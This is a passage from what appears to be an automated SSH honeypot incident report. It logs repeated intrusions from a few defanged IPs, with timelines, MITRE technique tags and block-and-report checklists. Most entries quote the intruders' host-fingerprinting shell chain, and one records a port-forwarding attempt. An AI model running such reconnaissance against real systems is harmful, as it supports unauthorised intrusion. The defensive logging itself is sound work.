| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:45:02` | `cowrie.session.connect` |
| `2026-07-06 04:45:03` | `cowrie.client.version` |
| `2026-07-06 04:45:03` | `cowrie.client.kex` |
| `2026-07-06 04:45:05` | `cowrie.login.success` |
| `2026-07-06 04:45:07` | `cowrie.session.params` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.success` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:07` | `cowrie.command.input` |
| `2026-07-06 04:45:08` | `cowrie.log.closed` |
| `2026-07-06 04:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8ce2029749

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 04:45 |
| **Last Seen** | 2026-07-06 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:45:44` | `cowrie.session.connect` |
| `2026-07-06 04:45:44` | `cowrie.client.version` |
| `2026-07-06 04:45:44` | `cowrie.client.kex` |
| `2026-07-06 04:45:44` | `cowrie.login.success` |
| `2026-07-06 04:45:45` | `cowrie.session.params` |
| `2026-07-06 04:45:45` | `cowrie.command.input` |
| `2026-07-06 04:45:45` | `cowrie.log.closed` |
| `2026-07-06 04:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7ba818dd01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:45 |
| **Last Seen** | 2026-07-06 04:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:45:50` | `cowrie.session.connect` |
| `2026-07-06 04:45:51` | `cowrie.client.version` |
| `2026-07-06 04:45:51` | `cowrie.client.kex` |
| `2026-07-06 04:45:54` | `cowrie.login.success` |
| `2026-07-06 04:45:56` | `cowrie.session.params` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.success` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:56` | `cowrie.command.input` |
| `2026-07-06 04:45:57` | `cowrie.log.closed` |
| `2026-07-06 04:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478ad911f003

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:46 |
| **Last Seen** | 2026-07-06 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:46:34` | `cowrie.session.connect` |
| `2026-07-06 04:46:34` | `cowrie.client.version` |
| `2026-07-06 04:46:34` | `cowrie.client.kex` |
| `2026-07-06 04:46:34` | `cowrie.login.success` |
| `2026-07-06 04:46:35` | `cowrie.session.params` |
| `2026-07-06 04:46:35` | `cowrie.command.input` |
| `2026-07-06 04:46:35` | `cowrie.log.closed` |
| `2026-07-06 04:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1d72504f7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:46 |
| **Last Seen** | 2026-07-06 04:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:46:37` | `cowrie.session.connect` |
| `2026-07-06 04:46:38` | `cowrie.client.version` |
| `2026-07-06 04:46:38` | `cowrie.client.kex` |
| `2026-07-06 04:46:41` | `cowrie.login.success` |
| `2026-07-06 04:46:43` | `cowrie.session.params` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.success` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:43` | `cowrie.command.input` |
| `2026-07-06 04:46:44` | `cowrie.log.closed` |
| `2026-07-06 04:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c1e9cd92f2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:47 |
| **Last Seen** | 2026-07-06 04:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:47:24` | `cowrie.session.connect` |
| `2026-07-06 04:47:25` | `cowrie.client.version` |
| `2026-07-06 04:47:25` | `cowrie.client.kex` |
| `2026-07-06 04:47:28` | `cowrie.login.success` |
| `2026-07-06 04:47:30` | `cowrie.session.params` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.success` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:30` | `cowrie.command.input` |
| `2026-07-06 04:47:31` | `cowrie.log.closed` |
| `2026-07-06 04:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f553d58d337

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:48 |
| **Last Seen** | 2026-07-06 04:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:48:11` | `cowrie.session.connect` |
| `2026-07-06 04:48:12` | `cowrie.client.version` |
| `2026-07-06 04:48:12` | `cowrie.client.kex` |
| `2026-07-06 04:48:15` | `cowrie.login.success` |
| `2026-07-06 04:48:18` | `cowrie.session.params` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.success` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.command.input` |
| `2026-07-06 04:48:18` | `cowrie.log.closed` |
| `2026-07-06 04:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b77af74703

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:48 |
| **Last Seen** | 2026-07-06 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:48:18` | `cowrie.session.connect` |
| `2026-07-06 04:48:18` | `cowrie.client.version` |
| `2026-07-06 04:48:18` | `cowrie.client.kex` |
| `2026-07-06 04:48:18` | `cowrie.login.success` |
| `2026-07-06 04:48:19` | `cowrie.session.params` |
| `2026-07-06 04:48:19` | `cowrie.command.input` |
| `2026-07-06 04:48:19` | `cowrie.log.closed` |
| `2026-07-06 04:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c504e60c73a3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 04:48 |
| **Last Seen** | 2026-07-06 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:48:27` | `cowrie.session.connect` |
| `2026-07-06 04:48:27` | `cowrie.client.version` |
| `2026-07-06 04:48:27` | `cowrie.client.kex` |
| `2026-07-06 04:48:27` | `cowrie.login.success` |
| `2026-07-06 04:48:27` | `cowrie.direct-tcpip.request` |
| `2026-07-06 04:48:28` | `cowrie.direct-tcpip.data` |
| `2026-07-06 04:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a201154ae6d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:49 |
| **Last Seen** | 2026-07-06 04:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:49:00` | `cowrie.session.connect` |
| `2026-07-06 04:49:01` | `cowrie.client.version` |
| `2026-07-06 04:49:01` | `cowrie.client.kex` |
| `2026-07-06 04:49:05` | `cowrie.login.success` |
| `2026-07-06 04:49:07` | `cowrie.session.params` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.success` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.command.input` |
| `2026-07-06 04:49:07` | `cowrie.log.closed` |
| `2026-07-06 04:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26799e4df00d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:49 |
| **Last Seen** | 2026-07-06 04:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:49:49` | `cowrie.session.connect` |
| `2026-07-06 04:49:50` | `cowrie.client.version` |
| `2026-07-06 04:49:50` | `cowrie.client.kex` |
| `2026-07-06 04:49:54` | `cowrie.login.success` |
| `2026-07-06 04:49:56` | `cowrie.session.params` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.success` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:56` | `cowrie.command.input` |
| `2026-07-06 04:49:57` | `cowrie.log.closed` |
| `2026-07-06 04:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-875e33974ad9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:49 |
| **Last Seen** | 2026-07-06 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:49:52` | `cowrie.session.connect` |
| `2026-07-06 04:49:52` | `cowrie.client.version` |
| `2026-07-06 04:49:52` | `cowrie.client.kex` |
| `2026-07-06 04:49:53` | `cowrie.login.success` |
| `2026-07-06 04:49:54` | `cowrie.session.params` |
| `2026-07-06 04:49:54` | `cowrie.command.input` |
| `2026-07-06 04:49:54` | `cowrie.log.closed` |
| `2026-07-06 04:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9040dac635ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:50 |
| **Last Seen** | 2026-07-06 04:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:50:38` | `cowrie.session.connect` |
| `2026-07-06 04:50:38` | `cowrie.client.version` |
| `2026-07-06 04:50:38` | `cowrie.client.kex` |
| `2026-07-06 04:50:42` | `cowrie.login.success` |
| `2026-07-06 04:50:44` | `cowrie.session.params` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.success` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:44` | `cowrie.command.input` |
| `2026-07-06 04:50:45` | `cowrie.log.closed` |
| `2026-07-06 04:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49b6cdfd677b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:51 |
| **Last Seen** | 2026-07-06 04:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:51:25` | `cowrie.session.connect` |
| `2026-07-06 04:51:26` | `cowrie.client.version` |
| `2026-07-06 04:51:26` | `cowrie.client.kex` |
| `2026-07-06 04:51:29` | `cowrie.login.success` |
| `2026-07-06 04:51:31` | `cowrie.session.params` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.success` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:31` | `cowrie.command.input` |
| `2026-07-06 04:51:32` | `cowrie.log.closed` |
| `2026-07-06 04:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50356dd638d5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:51 |
| **Last Seen** | 2026-07-06 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:51:26` | `cowrie.session.connect` |
| `2026-07-06 04:51:26` | `cowrie.client.version` |
| `2026-07-06 04:51:26` | `cowrie.client.kex` |
| `2026-07-06 04:51:26` | `cowrie.login.success` |
| `2026-07-06 04:51:27` | `cowrie.session.params` |
| `2026-07-06 04:51:27` | `cowrie.command.input` |
| `2026-07-06 04:51:27` | `cowrie.log.closed` |
| `2026-07-06 04:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19135d8c2f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:52 |
| **Last Seen** | 2026-07-06 04:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
